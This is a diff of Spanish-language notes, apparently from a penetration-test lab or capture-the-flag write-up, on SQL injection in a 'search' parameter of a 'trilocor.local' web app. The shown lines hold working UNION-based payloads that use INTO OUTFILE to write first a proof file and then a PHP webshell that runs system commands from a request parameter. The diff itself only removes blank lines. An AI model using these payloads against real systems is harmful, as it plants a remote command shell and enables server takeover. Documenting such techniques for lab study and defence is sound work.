@@ -142,7 +142,6 @@ SQLi en el parámetro `search` para escribir un webshell PHP vía `INTO OUTFILE`
 - **Parámetro vulnerable:** `search`
 
 **Prueba de escritura** (escribe un archivo de confirmación):
-
 ```
 search=test'+UNION+select+1,2,3,'file+written+successfully',5,6+into+outfile+'/var/www/public/proof.txt'--+-
 ```
@@ -150,7 +149,6 @@ search=test'+UNION+select+1,2,3,'file+written+successfully',5,6+into+outfile+'/v
 Confirmar visitando `www.trilocor.local:8080/proof.txt`.
 
 **Escribir el webshell:**
-
 ```
 search=test'+UNION+select+1,2,3,'<?php+system($_REQUEST[cmd]);+?>',5,6+into+outfile+'/var/www/public/web-shell.php'--+-
 ```
